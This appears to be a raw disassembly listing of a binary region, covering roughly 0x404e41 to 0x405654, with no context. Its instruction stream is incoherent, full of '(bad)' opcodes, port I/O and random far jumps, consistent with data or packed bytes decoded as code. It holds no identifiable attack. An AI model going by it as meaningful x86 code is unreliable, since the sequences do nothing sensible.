  404e41:	inc    esi
  404e42:	popa   
  404e43:	loop   0x404df9
  404e45:	pop    esi
  404e46:	xchg   DWORD PTR [edi-0x1e624723],ebp
  404e4c:	(bad)  
  404e4e:	add    eax,0xdf636b8a
  404e53:	sbb    dh,BYTE PTR [edi]
  404e55:	in     eax,0x76
  404e57:	mov    ch,0x27
  404e59:	sub    eax,0x910c96f0
  404e5e:	xchg   BYTE PTR [eax+0x78451a4d],dh
  404e64:	pushf  
  404e65:	out    0xdb,al
  404e67:	push   0xd5acdedf
  404e6c:	ja     0x404e4d
  404e6e:	jge    0x404e94
  404e70:	rcr    ecx,1
  404e72:	xchg   esi,eax
  404e73:	nop
  404e74:	stc    
  404e75:	inc    ecx
  404e76:	push   eax
  404e77:	ins    DWORD PTR es:[edi],dx
  404e78:	mov    ds:0x282d965b,al
  404e7d:	ins    DWORD PTR es:[edi],dx
  404e7e:	popa   
  404e7f:	bnd jmp 0x404e15
  404e82:	jnp    0x404ef8
  404e84:	lahf   
  404e85:	pop    ss
  404e86:	das    
  404e87:	fdiv   QWORD PTR [ebx]
  404e89:	int    0x8d
  404e8b:	imul   edi,DWORD PTR [ebx],0xffffffee
  404e8e:	ins    DWORD PTR es:[edi],dx
  404e8f:	loopne 0x404e5f
  404e91:	push   edi
  404e92:	pop    ecx
  404e93:	test   BYTE PTR [esi+0x254187fe],0xf9
  404e9a:	imul   esp,esi,0x9d061466
  404ea0:	pop    ds
  404ea1:	inc    ebp
  404ea2:	in     eax,0xaa
  404ea4:	rcr    al,cl
  404ea6:	pop    ebx
  404ea7:	cmp    eax,DWORD PTR [ecx-0x5f756f49]
  404ead:	dec    edi
  404eae:	hlt    
  404eaf:	cld    
  404eb0:	mov    ecx,0x35c72eec
  404eb5:	mov    al,0xf4
  404eb7:	imul   DWORD PTR ds:0x7335d610
  404ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ebe:	(bad)  
  404ebf:	adc    BYTE PTR [edx-0x69],bl
  404ec2:	int    0x3f
  404ec4:	pop    edx
  404ec5:	inc    ebp
  404ec6:	mov    dl,0x80
  404ec8:	ss je  0x404ee3
  404ecb:	xchg   ebx,ebp
  404ecd:	inc    ecx
  404ece:	lds    esi,FWORD PTR [eax+edx*4-0x41]
  404ed2:	push   ds
  404ed3:	sbb    eax,0xd08b64e7
  404ed8:	sub    al,0x40
  404eda:	in     al,0x8a
  404edc:	mov    ecx,0x1f8a8ae2
  404ee1:	mov    eax,0x4c2ea2ac
  404ee6:	jne    0x404e82
  404ee8:	jnp    0x404e7e
  404eea:	add    eax,0x86c52b9
  404eef:	(bad)  
  404ef0:	cmp    esp,edi
  404ef2:	fcom   st(3)
  404ef4:	addr16 mov al,0x8c
  404ef7:	sti    
  404ef8:	enter  0xc19d,0x4e
  404efc:	mov    eax,0xab231295
  404f01:	(bad)  
  404f02:	push   edi
  404f03:	mov    ebx,0x392e1c5e
  404f08:	inc    esp
  404f09:	shl    DWORD PTR [eax-0x53a2e4a4],0x5e
  404f10:	in     eax,0x9
  404f12:	add    esi,esi
  404f14:	popf   
  404f15:	dec    edx
  404f16:	retf   
  404f17:	mov    gs,WORD PTR [edx+0x2012c909]
  404f1d:	mov    bh,0xfa
  404f1f:	and    BYTE PTR [eax+0x12],ch
  404f22:	xor    eax,0x5cf4b185
  404f27:	xchg   BYTE PTR [edx+0x15096066],bl
  404f2d:	push   edi
  404f2e:	clc    
  404f2f:	or     BYTE PTR ss:[esi],0x47
  404f33:	xchg   edi,eax
  404f34:	xor    eax,0xf34a4ebe
  404f39:	fwait
  404f3a:	and    BYTE PTR [ecx-0xf],dh
  404f3d:	mov    bl,0xb7
  404f3f:	(bad)
  404f42:	jmp    0x404f11
  404f44:	xor    al,0x27
  404f46:	pop    edx
  404f47:	imul   ebp,DWORD PTR [eax+0x673a6faf],0x6b10ea94
  404f51:	out    0x5d,al
  404f53:	jnp    0x404ee1
  404f55:	mov    esp,0x2e6bcc5e
  404f5a:	and    al,0x49
  404f5c:	pop    es
  404f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5e:	(bad)  
  404f5f:	std    
  404f60:	out    dx,eax
  404f61:	cmp    DWORD PTR [esi+ecx*8],0xad3386f4
  404f68:	gs dec edx
  404f6a:	sahf   
  404f6b:	cmp    al,0xa7
  404f6d:	xchg   ebx,eax
  404f6e:	outs   dx,BYTE PTR ds:[esi]
  404f6f:	jbe    0x404fa4
  404f71:	jp     0x404fe6
  404f73:	mov    ax,ds:0x148cb1f4
  404f79:	inc    ebp
  404f7a:	inc    ebx
  404f7b:	out    dx,al
  404f7c:	not    DWORD PTR [edx-0x6e]
  404f7f:	ficomp WORD PTR [ebx-0x402d00fe]
  404f85:	shr    BYTE PTR [ebp-0x2c9249c],1
  404f8b:	es (bad) 
  404f8d:	std    
  404f8e:	clc    
  404f8f:	enter  0x1278,0xfd
  404f93:	or     al,0xe1
  404f95:	inc    esi
  404f96:	mov    cl,0xd6
  404f98:	inc    edx
  404f99:	dec    edx
  404f9a:	out    0x9f,eax
  404f9c:	jp     0x404ff3
  404f9e:	ins    DWORD PTR es:[edi],dx
  404f9f:	lock out dx,al
  404fa1:	push   esp
  404fa2:	sbb    ch,bh
  404fa4:	ds push ecx
  404fa6:	psrld  mm3,mm0
  404fa9:	cmp    al,0x67
  404fab:	pop    es
  404fac:	cld    
  404fad:	shl    BYTE PTR [ebx],0xc8
  404fb0:	cmp    eax,0x70a8a56d
  404fb5:	push   edx
  404fb6:	jae    0x404f9e
  404fb8:	cmc    
  404fb9:	shr    DWORD PTR [eax],cl
  404fbb:	inc    edx
  404fbc:	dec    ebp
  404fbd:	push   ebp
  404fbe:	push   0x14
  404fc0:	cmp    edi,DWORD PTR [edi+0x28]
  404fc3:	sub    edi,esp
  404fc5:	call   0xcf7de9b5
  404fca:	pop    edi
  404fcb:	cmp    edx,0x51567d89
  404fd1:	nop
  404fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd3:	pop    ecx
  404fd4:	arpl   WORD PTR [edi],dx
  404fd6:	sub    BYTE PTR [edx+0x290c3b6c],ch
  404fdc:	imul   eax,DWORD PTR [eax+0x7b],0xced5fbc7
  404fe3:	gs gs sub eax,0x7ef177a1
  404fea:	imul   eax,DWORD PTR [ebx],0x76
  404fed:	mov    cl,0xa5
  404fef:	mov    ecx,0x5a50d790
  404ff4:	ss jnp 0x405049
  404ff7:	cmp    BYTE PTR [edx+0x57],0x1b
  404ffb:	outs   dx,DWORD PTR ds:[esi]
  404ffc:	or     ebp,DWORD PTR [eax+eiz*8+0x74]
  405000:	mov    edx,DWORD PTR [edx]
  405002:	jge    0x404f96
  405004:	ss push ds
  405006:	int3   
  405007:	loope  0x404fa9
  405009:	(bad)
  40500c:	mov    ds:0x260d0174,eax
  405011:	mov    cl,0x14
  405013:	sub    BYTE PTR [ecx-0x68],bl
  405016:	add    eax,ebp
  405018:	nop
  405019:	sub    ch,cl
  40501b:	fidiv  WORD PTR [ebp-0x666c95be]
  405021:	mov    bh,0x7d
  405023:	(bad)  
  405025:	add    BYTE PTR [edx],ah
  405027:	and    al,0xa7
  405029:	test   eax,0x5076bc78
  40502e:	push   ss
  40502f:	loop   0x40507e
  405031:	hlt    
  405032:	mov    al,ds:0xedab5221
  405037:	iret   
  405038:	xchg   ecx,eax
  405039:	js     0x4050ab
  40503b:	inc    ebp
  40503c:	test   al,0x31
  40503e:	pop    ebp
  40503f:	bound  ebp,QWORD PTR [edx]
  405041:	les    esi,FWORD PTR [edi+0x64]
  405044:	into   
  405045:	add    bh,BYTE PTR [ecx]
  405047:	and    BYTE PTR [eax+0x3673d7cb],bl
  40504d:	loopne 0x405046
  40504f:	mov    dh,0x48
  405051:	mov    ebx,0x3d0c75ee
  405056:	stos   BYTE PTR es:[edi],al
  405057:	xor    BYTE PTR [ebx-0x48],ah
  40505a:	lds    sp,DWORD PTR [ebp+0x21c3c0f4]
  405061:	bound  eax,QWORD PTR [ecx-0x687ef256]
  405067:	push   ds
  405068:	jbe    0x405021
  40506a:	adc    ebp,esp
  40506c:	mov    eax,0xad2af419
  405071:	jg     0x4050e6
  405073:	inc    eax
  405074:	mov    esp,esi
  405076:	mov    ebp,0x700673cf
  40507b:	popa   
  40507c:	push   eax
  40507d:	cs jg  0x405098
  405080:	add    DWORD PTR [eax],eax
  405082:	xlat   BYTE PTR ds:[ebx]
  405083:	adc    BYTE PTR [ebx],0xbf
  405086:	push   cs
  405087:	add    al,0xd6
  405089:	lods   eax,DWORD PTR ds:[esi]
  40508a:	imul   ecx,DWORD PTR [ecx-0x311bdce3],0xffffffea
  405091:	js     0x40504d
  405093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405094:	mul    DWORD PTR [ebp+0x1b]
  405097:	pop    ecx
  405098:	dec    edi
  405099:	test   eax,0x466a5a91
  40509e:	mov    al,ds:0xf0550230
  4050a3:	mov    ebx,0xe60d0765
  4050a8:	xchg   ebx,eax
  4050a9:	(bad)  
  4050aa:	pop    ss
  4050ab:	add    ebx,ebx
  4050ad:	mov    ebp,ebp
  4050af:	bound  esi,QWORD PTR [ebp-0x12]
  4050b2:	add    BYTE PTR [eax+0x3001a34f],0xa6
  4050b9:	xchg   BYTE PTR [eax+0x5ac779de],cl
  4050bf:	push   0xffffffd7
  4050c1:	loope  0x4050b3
  4050c3:	sbb    esi,DWORD PTR [eax]
  4050c5:	mov    ebp,0xce9d99f4
  4050ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050cb:	push   esp
  4050cc:	aas    
  4050cd:	repz gs out 0x30,eax
  4050d1:	ins    BYTE PTR es:[edi],dx
  4050d2:	fist   DWORD PTR [ebp+0x2b62a666]
  4050d8:	dec    ecx
  4050d9:	or     DWORD PTR [ecx],edx
  4050db:	dec    ebx
  4050dc:	ss inc esp
  4050de:	test   BYTE PTR [esi],al
  4050e0:	cdq    
  4050e1:	(bad)  
  4050e2:	xchg   edi,eax
  4050e3:	imul   edx,DWORD PTR [edx-0x21de4db],0x2ce69e23
  4050ed:	xchg   eax,edx
  4050ef:	icebp  
  4050f0:	shl    BYTE PTR [ebp+0x55784d6d],cl
  4050f6:	or     edi,DWORD PTR [esi+ebp*1]
  4050f9:	mov    ebp,0xfe7e58e0
  4050fe:	jnp    0x40511d
  405100:	pusha  
  405101:	pop    ds
  405102:	or     eax,DWORD PTR [eax+0x258f88bd]
  405108:	clc    
  405109:	test   eax,0xb1b4144e
  40510e:	xchg   bl,cl
  405110:	loop   0x4050f1
  405112:	call   0x353e9622
  405117:	ds test eax,0xe5de7f21
  40511d:	mov    esi,0x6b8cc575
  405122:	nop
  405123:	test   BYTE PTR [ecx+0x51],bh
  405126:	popa   
  405127:	mov    cl,0x47
  405129:	jb     0x4050f4
  40512b:	push   esp
  40512c:	call   0xd711b152
  405131:	sub    esi,edi
  405133:	ins    BYTE PTR es:[edi],dx
  405134:	stos   DWORD PTR es:[edi],eax
  405135:	or     eax,0x5c0317fb
  40513a:	jmp    edx
  40513c:	in     al,dx
  40513d:	shl    edi,1
  40513f:	adc    eax,0xd8148fc4
  405144:	sar    BYTE PTR [ecx-0x1e95728],0xfe
  40514b:	dec    edx
  40514c:	pop    edi
  40514d:	int3   
  40514e:	les    ebp,FWORD PTR [edi+0x262668b3]
  405154:	out    dx,al
  405155:	mov    ebx,0x4eb8a1da
  40515a:	lock lods al,BYTE PTR ds:[esi]
  40515c:	das    
  40515d:	jg     0x4050e7
  40515f:	pop    es
  405160:	mov    eax,0x9f6b5759
  405165:	fcom   DWORD PTR [ecx-0x2bde9961]
  40516b:	xor    dl,BYTE PTR [eax-0x6905fec0]
  405171:	dec    eax
  405172:	inc    ebx
  405173:	sbb    eax,0x47a55189
  405178:	mov    bl,0xc8
  40517a:	call   0x300760a3
  40517f:	lock neg DWORD PTR [ebp+0x70]
  405183:	ss in  al,0x7b
  405186:	or     BYTE PTR [esi-0x7e49b344],ch
  40518c:	dec    edi
  40518d:	les    ebx,FWORD PTR [di]
  405190:	icebp  
  405191:	mov    bh,0x32
  405193:	repnz or ebp,ecx
  405196:	jle    0x40514d
  405198:	xor    al,0x60
  40519a:	push   es
  40519b:	jno    0x405186
  40519d:	push   esp
  40519e:	mov    BYTE PTR [ecx-0x19029dba],ch
  4051a4:	cld    
  4051a5:	cmp    al,al
  4051a7:	xor    esi,DWORD PTR ds:0xd6c5de10
  4051ad:	popf   
  4051ae:	cdq    
  4051af:	nop
  4051b0:	add    DWORD PTR [ebp+0x31],0x92663ce8
  4051b7:	repz adc al,0x6f
  4051ba:	scas   al,BYTE PTR es:[edi]
  4051bb:	lods   al,BYTE PTR ds:[esi]
  4051bc:	xchg   esp,eax
  4051bd:	lock imul ebp,DWORD PTR [edi+0x44],0x487ce05
  4051c5:	mov    BYTE PTR [ecx-0x3],ch
  4051c8:	jg     0x405203
  4051ca:	into   
  4051cb:	mov    fs,WORD PTR [ecx+ebx*2-0x67e85581]
  4051d2:	jmp    0xed93:0x3cdc89a6
  4051d9:	inc    ebp
  4051da:	lods   eax,DWORD PTR ds:[esi]
  4051db:	xor    dh,BYTE PTR [esi+0x6f]
  4051de:	xor    al,0x3c
  4051e0:	xor    bl,BYTE PTR [edx]
  4051e2:	mov    esp,0x32da97df
  4051e7:	xlat   BYTE PTR ds:[ebx]
  4051e8:	int    0x78
  4051ea:	sub    DWORD PTR [edx+0x1fd17abe],esp
  4051f0:	and    al,cl
  4051f2:	scas   al,BYTE PTR es:[edi]
  4051f3:	or     al,0x58
  4051f5:	dec    eax
  4051f6:	mov    bh,0x43
  4051f8:	sub    edx,DWORD PTR [edx+eax*1]
  4051fb:	xchg   ebp,eax
  4051fc:	dec    edi
  4051fd:	addr16 pop esp
  4051ff:	inc    ecx
  405200:	stos   DWORD PTR es:[edi],eax
  405201:	and    ah,BYTE PTR [edx]
  405203:	jnp    0x40519c
  405205:	and    esi,DWORD PTR [edx]
  405207:	inc    esi
  405208:	outs   dx,BYTE PTR ds:[esi]
  405209:	inc    esi
  40520a:	out    dx,eax
  40520b:	les    edx,FWORD PTR [edi-0x385c80f5]
  405211:	sbb    eax,0x65f7275f
  405216:	or     al,0x89
  405218:	cmp    edi,esi
  40521a:	jge    0x405253
  40521c:	pop    esi
  40521d:	sbb    esi,DWORD PTR [esi-0x73]
  405220:	xchg   edx,eax
  405221:	inc    ebp
  405222:	sti    
  405223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405224:	lds    ebp,FWORD PTR [edx]
  405226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405227:	inc    esi
  405228:	not    DWORD PTR [esi]
  40522a:	mov    DWORD PTR [ecx-0x79],edx
  40522d:	shr    DWORD PTR [edx],0xd3
  405230:	test   DWORD PTR [edx+0x2bf40d8f],edx
  405236:	xchg   ebx,eax
  405237:	in     eax,dx
  405238:	mov    eax,0xb1512b
  40523d:	imul   ebp
  40523f:	jne    0x40521b
  405241:	iret   
  405242:	jl     0x4051e7
  405244:	ja     0x405277
  405246:	test   bh,dl
  405248:	adc    al,0x7e
  40524a:	lods   al,BYTE PTR ds:[esi]
  40524b:	fcom   DWORD PTR [ebx-0x488d1e1d]
  405251:	test   eax,0xf01e97aa
  405256:	adc    DWORD PTR [ecx],ebp
  405258:	js     0x40527b
  40525a:	cld    
  40525b:	jmp    0x3fc0:0xc186a949
  405262:	aad    0x3e
  405264:	adc    eax,0x8143fa30
  405269:	or     ebp,ebx
  40526b:	or     eax,0xcd9646d
  405270:	xchg   ecx,eax
  405271:	rol    DWORD PTR [ebx-0x1b25191],0xe4
  405278:	test   esp,0xfb430c94
  40527e:	imul   edi,DWORD PTR [eax+0x35c62f42],0xffffffa2
  405285:	and    edx,DWORD PTR [edx+0x58]
  405288:	or     eax,ecx
  40528a:	lods   al,BYTE PTR ds:[esi]
  40528b:	inc    ecx
  40528c:	outs   dx,BYTE PTR ds:[esi]
  40528d:	jmp    0x38a9:0xf6721617
  405294:	adc    ebx,DWORD PTR [esi+0x6d]
  405297:	jge    0x40527b
  405299:	push   0x5cdedee5
  40529e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40529f:	call   0x2efc:0x9c7c794f
  4052a6:	cmp    BYTE PTR [edi],al
  4052a8:	fisubr DWORD PTR [esi-0x16a01da0]
  4052ae:	cmp    BYTE PTR [edx-0x50],cl
  4052b1:	in     al,dx
  4052b2:	or     DWORD PTR [ecx-0x28f67450],eax
  4052b8:	stos   BYTE PTR es:[edi],al
  4052b9:	(bad)  
  4052bb:	mov    ch,0x44
  4052bd:	and    al,0x3d
  4052bf:	sub    eax,0x60887059
  4052c4:	(bad)
  4052c7:	add    DWORD PTR [ecx+0x4c],0x63
  4052cb:	fs cmp eax,0xf5994a6c
  4052d1:	daa    
  4052d2:	in     al,dx
  4052d3:	jns    0x4052c9
  4052d5:	xchg   DWORD PTR [edi+ebx*2],esp
  4052d8:	xchg   esp,eax
  4052d9:	pop    edi
  4052da:	mov    edx,0xb8b71497
  4052df:	ins    DWORD PTR es:[edi],dx
  4052e0:	xor    al,0x7d
  4052e2:	and    eax,0xecb938bb
  4052e7:	sub    BYTE PTR [eax-0x490dac92],bh
  4052ed:	and    BYTE PTR [esi],ah
  4052ef:	cmp    al,0xb7
  4052f1:	ror    BYTE PTR [ebp+0x30],0x8e
  4052f5:	or     al,BYTE PTR [ebx]
  4052f7:	dec    edi
  4052f8:	es jl  0x40533a
  4052fb:	test   eax,0x88ad04bc
  405300:	adc    DWORD PTR [edi],ecx
  405302:	and    eax,0x146cc5d5
  405307:	sar    DWORD PTR [ecx],0x87
  40530a:	pop    es
  40530b:	adc    DWORD PTR [ebx-0x3125b523],0xa
  405312:	jmp    FWORD PTR [ebx+0x2138f2fd]
  405318:	inc    edx
  405319:	(bad)  
  40531a:	hlt    
  40531b:	or     al,0x97
  40531d:	daa    
  40531e:	das    
  40531f:	jg     0x4052f9
  405321:	dec    edi
  405322:	fisttp WORD PTR [ebx+eiz*2-0x73f6b58]
  405329:	xlat   BYTE PTR ds:[ebx]
  40532a:	retf   0x6ad3
  40532d:	loopne 0x4052b9
  40532f:	in     eax,0x84
  405331:	pop    edi
  405332:	fcomp  DWORD PTR [ebp+0xe]
  405335:	xor    BYTE PTR [eax+0x52],cl
  405338:	push   edi
  405339:	ds mov al,0xc5
  40533c:	ins    BYTE PTR es:[edi],dx
  40533d:	cmc    
  40533e:	xchg   al,dh
  405340:	mov    ecx,0x10dac6a0
  405345:	xchg   ebp,eax
  405346:	xlat   BYTE PTR ds:[ebx]
  405347:	jmp    0xfdb65f2c
  40534c:	mov    ebx,0x95e4194c
  405351:	pop    eax
  405352:	mov    ecx,0x9b449781
  405357:	cmp    BYTE PTR [esi-0x1807337f],ah
  40535d:	inc    ecx
  40535e:	shl    BYTE PTR [eax+ebp*2],1
  405361:	out    dx,eax
  405362:	div    DWORD PTR [ebx-0x87d45d2]
  405368:	push   ebx
  405369:	in     al,0x5
  40536b:	mov    DWORD PTR [edx-0x6a],ecx
  40536e:	add    ch,ah
  405370:	xchg   edi,eax
  405371:	adc    DWORD PTR [eax-0x41667b8b],edi
  405377:	fdiv   QWORD PTR [ecx-0x29265c4c]
  40537d:	pop    ebp
  40537e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40537f:	test   DWORD PTR [edi],esp
  405381:	jg     0x4053ed
  405383:	test   BYTE PTR [ebp+0x3a3ccb21],0xe2
  40538a:	xchg   ebx,eax
  40538b:	mov    ds,WORD PTR [eax-0x1a3aa837]
  405391:	xchg   BYTE PTR [ebp-0x1a],ah
  405394:	cdq    
  405395:	jmp    0x405327
  405397:	je     0x405409
  405399:	jnp    0x405341
  40539b:	es push ebp
  40539d:	out    dx,al
  40539e:	repz in eax,dx
  4053a0:	ja     0x405372
  4053a2:	mov    al,BYTE PTR [ebp+0x79]
  4053a5:	pop    edi
  4053a6:	mov    esp,0xeb7533cb
  4053ab:	jns    0x4053e9
  4053ad:	dec    edx
  4053ae:	adc    al,0x14
  4053b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b1:	stos   BYTE PTR es:[edi],al
  4053b2:	xor    eax,0xa0ddb4fe
  4053b7:	sbb    DWORD PTR [edi+0x78],esp
  4053ba:	pop    es
  4053bb:	pop    es
  4053bc:	push   edx
  4053bd:	out    dx,eax
  4053be:	jae    0x405423
  4053c0:	push   ds
  4053c1:	mov    esp,0xd9357381
  4053c6:	cmp    dh,BYTE PTR ds:0x636f7345
  4053cc:	inc    ebx
  4053cd:	jmp    0x10ab8b7c
  4053d2:	ffree  st(4)
  4053d4:	sub    eax,DWORD PTR [esi]
  4053d6:	mov    esp,DWORD PTR ds:0x2ff31554
  4053dc:	push   cs
  4053dd:	xchg   ebx,eax
  4053de:	pop    esp
  4053df:	shl    BYTE PTR cs:[esi+0x12],0x59
  4053e4:	jne    0x4053ef
  4053e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053e7:	(bad)  
  4053e8:	imul   edx,DWORD PTR [edx+0x2925a32a],0x6c60e390
  4053f2:	push   0xf6994fb
  4053f7:	(bad)  
  4053f8:	cld    
  4053f9:	push   ecx
  4053fa:	out    dx,eax
  4053fb:	(bad)  
  4053fc:	int    0x15
  4053fe:	std    
  4053ff:	dec    eax
  405400:	cmc    
  405401:	xor    esp,edi
  405403:	fs ins DWORD PTR es:[edi],dx
  405405:	or     DWORD PTR [edi+esi*1-0x6a],0x88795a48
  40540d:	mov    edi,0x4d324aed
  405412:	add    dl,BYTE PTR [edi-0x76]
  405415:	xchg   edi,eax
  405416:	add    ecx,ebx
  405418:	mov    al,ds:0xe9a0d817
  40541d:	ret    0xb726
  405420:	ret    0xeade
  405423:	sbb    eax,0x5821d96c
  405428:	ror    edx,0x5
  40542b:	mov    ch,0x2c
  40542d:	sar    BYTE PTR [ecx-0x55dc7d0d],1
  405433:	fdivr  QWORD PTR [ebx+0x7f258454]
  405439:	or     ebx,DWORD PTR [ebp-0x35330f0d]
  40543f:	mov    cl,0xeb
  405441:	repz jno 0x405446
  405444:	stos   BYTE PTR es:[edi],al
  405445:	xor    BYTE PTR [ecx],al
  405447:	(bad)  
  405448:	arpl   WORD PTR [edx],di
  40544a:	retf   0x582f
  40544d:	test   eax,0xecde6155
  405452:	and    BYTE PTR [ebp+ebx*2+0x19],0xa9
  405457:	loopne 0x405455
  405459:	xchg   edx,eax
  40545a:	xchg   BYTE PTR [ebp+0x4f],ch
  40545d:	or     BYTE PTR [eax-0x66571ffb],ah
  405463:	aad    0xcd
  405465:	or     eax,0x3dd0d8a6
  40546a:	ret    0x6b78
  40546d:	leave  
  40546e:	push   edx
  40546f:	hlt    
  405470:	mov    ds:0x4ae58998,eax
  405475:	loopne 0x405482
  405477:	xor    BYTE PTR [eax-0x4a],bl
  40547a:	inc    edi
  40547b:	mov    edi,?
  40547d:	mov    al,0x24
  40547f:	mov    fs,WORD PTR [esi-0x5b15bb05]
  405485:	lea    ebx,[esi+0x7b]
  405488:	xchg   ecx,eax
  405489:	sub    DWORD PTR [ecx-0x656c0207],esp
  40548f:	repnz sti 
  405491:	cwde   
  405492:	or     DWORD PTR [esi],0x20705198
  405498:	inc    eax
  405499:	shr    bl,0x4d
  40549c:	callw  0x9cf8
  4054a0:	mov    BYTE PTR ds:0x1e72857a,ch
  4054a6:	add    esi,DWORD PTR [ecx-0x6d]
  4054a9:	iret   
  4054aa:	jo     0x405439
  4054ac:	nop
  4054ad:	mov    BYTE PTR [edi-0x80],cl
  4054b0:	mov    ebp,cs
  4054b2:	vhaddps ymm3,ymm3,ymm0
  4054b6:	sub    edi,DWORD PTR [edi-0x6320a5fc]
  4054bc:	adc    al,0x7b
  4054be:	cmp    al,0xe5
  4054c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054c1:	fsub   st,st(5)
  4054c3:	push   ecx
  4054c4:	jmp    0x861d:0x6bf8b002
  4054cb:	(bad)  
  4054cc:	ficomp WORD PTR [eax]
  4054ce:	data16 sti 
  4054d0:	sub    eax,0x281ff6f9
  4054d5:	mov    ds:0xcce70a0c,eax
  4054da:	aas    
  4054db:	inc    ecx
  4054dc:	mov    ebx,0x583bd51
  4054e1:	mov    bh,BYTE PTR ds:0x186cee2
  4054e7:	leave  
  4054e8:	sbb    al,BYTE PTR [edi+0x60]
  4054eb:	test   BYTE PTR [edi-0x3883486f],bl
  4054f1:	(bad)  
  4054f2:	out    dx,al
  4054f3:	push   0x3c
  4054f5:	xor    eax,0x625ba27f
  4054fa:	push   eax
  4054fb:	push   esp
  4054fc:	fwait
  4054fd:	cld    
  4054fe:	gs out dx,al
  405500:	call   DWORD PTR [edx+0x36]
  405503:	shl    DWORD PTR [ecx+ecx*2],1
  405506:	ds pop esp
  405508:	mov    edi,0x818ee080
  40550d:	aam    0xd3
  40550f:	xchg   edi,eax
  405510:	mov    ecx,0x43411c3a
  405515:	jae    0x405576
  405517:	rol    BYTE PTR ds:0xbf926b9b,cl
  40551d:	test   BYTE PTR [ebx],al
  40551f:	scas   eax,DWORD PTR es:[edi]
  405520:	repz (bad) 
  405522:	pop    ecx
  405523:	cmp    eax,0x1dceba52
  405528:	jge    0x405510
  40552a:	dec    ebx
  40552b:	es xchg edx,eax
  40552d:	repnz cwde 
  40552f:	dec    ecx
  405530:	outs   dx,DWORD PTR ds:[esi]
  405531:	fwait
  405532:	lock sar DWORD PTR [ebx],0xa1
  405536:	cmp    eax,0x799adba6
  40553b:	jno    0x405552
  40553d:	xchg   ecx,eax
  40553e:	into   
  40553f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405540:	and    dh,BYTE PTR [ecx-0x70484c6a]
  405546:	sub    dh,BYTE PTR [esi-0x2b]
  405549:	inc    DWORD PTR [edx+0x42]
  40554c:	(bad)  
  40554d:	aas    
  40554e:	fistp  QWORD PTR [esi+0x2d]
  405551:	sub    eax,0xa453d1fa
  405556:	add    eax,0x6b1362c9
  40555b:	out    0xa0,eax
  40555d:	mov    dl,0xb2
  40555f:	call   0xd26d1c3b
  405564:	mov    ebx,0x99f27738
  405569:	or     al,0xc7
  40556b:	add    BYTE PTR [ebp-0x5a],cl
  40556e:	dec    esp
  40556f:	lods   eax,DWORD PTR ds:[esi]
  405570:	popa   
  405571:	mov    al,0xcf
  405573:	(bad)  
  405574:	mov    eax,ds:0x2edc4dd
  405579:	cmp    DWORD PTR [esi],esi
  40557b:	mov    edx,0x34f6cefc
  405580:	mov    BYTE PTR [eax-0x1],0xa8
  405584:	in     eax,dx
  405585:	push   ebp
  405586:	outs   dx,BYTE PTR ds:[esi]
  405587:	fidivr DWORD PTR [ebx]
  405589:	pop    esi
  40558a:	or     esp,esp
  40558c:	pop    esp
  40558d:	sub    eax,0xe84a4b2a
  405592:	mov    cl,0x2c
  405594:	adc    eax,0x6cd8fe93
  405599:	clc    
  40559a:	xor    eax,0x93ba19e
  40559f:	loopne 0x40561a
  4055a1:	es inc edi
  4055a3:	pop    ecx
  4055a4:	and    al,0x54
  4055a6:	mov    al,BYTE PTR [edx-0x4ba91c6b]
  4055ac:	jns    0x405572
  4055ae:	mov    ecx,esp
  4055b0:	sub    DWORD PTR [ebx],0x7c
  4055b3:	mov    esp,0xf2f1d735
  4055b8:	loope  0x405630
  4055ba:	dec    eax
  4055bb:	cmp    eax,eax
  4055bd:	ins    DWORD PTR es:[edi],dx
  4055be:	and    bh,ah
  4055c0:	outs   dx,BYTE PTR ds:[esi]
  4055c1:	cwde   
  4055c2:	push   ebp
  4055c3:	push   cs
  4055c4:	rol    esp,0xba
  4055c7:	sar    cl,0xfe
  4055ca:	cmp    edi,ebx
  4055cc:	shr    esp,1
  4055ce:	mov    esi,0xbfc94a61
  4055d3:	push   cs
  4055d4:	mov    bh,0x95
  4055d6:	aad    0x16
  4055d8:	push   esp
  4055d9:	shr    bl,1
  4055db:	ret    0x1a09
  4055de:	idiv   al
  4055e0:	aad    0x83
  4055e2:	pop    ebp
  4055e3:	cli    
  4055e4:	pop    ebx
  4055e5:	outs   dx,BYTE PTR ds:[esi]
  4055e6:	sbb    edi,DWORD PTR ds:0x23fda5bb
  4055ec:	ja     0x4055ee
  4055ee:	jmp    0x9ad6:0xfe0622a3
  4055f5:	js     0x405612
  4055f7:	xor    bl,BYTE PTR [edi]
  4055f9:	cld    
  4055fa:	and    dh,BYTE PTR [esp+eax*1]
  4055fd:	xlat   BYTE PTR ds:[ebx]
  4055fe:	sub    eax,0xa60bc7fa
  405603:	sub    edi,ebx
  405605:	sub    al,0xc4
  405607:	inc    esi
  405608:	xchg   ebp,eax
  405609:	sbb    ah,BYTE PTR [edi+ebp*1-0xa]
  40560d:	int    0x6b
  40560f:	retf   0xd3a0
  405612:	sub    cl,BYTE PTR [esp+eax*2]
  405615:	fidivr WORD PTR [edx-0x1658053b]
  40561b:	fild   QWORD PTR ds:0x46c5fe15
  405621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405622:	lock mov ds:0x780990b1,eax
  405628:	push   0xffffffb6
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	fcmovnu st,st(7)
  40562d:	xor    eax,0x64a87b3b
  405632:	cs sbb eax,0x5a2b2db4
  405638:	jmp    0x510b:0xbe1d7a4d
  40563f:	sahf   
  405640:	sub    ecx,esi
  405642:	aas    
  405643:	sbb    DWORD PTR [esi],eax
  405645:	aas    
  405646:	retf   0x3e9c
  405649:	cmp    BYTE PTR [ebx+0x50],al
  40564c:	pop    ebx
  40564d:	cmp    BYTE PTR [ebx-0x2b1164c0],ah
  405653:	dec    ecx
  405654:	fwait
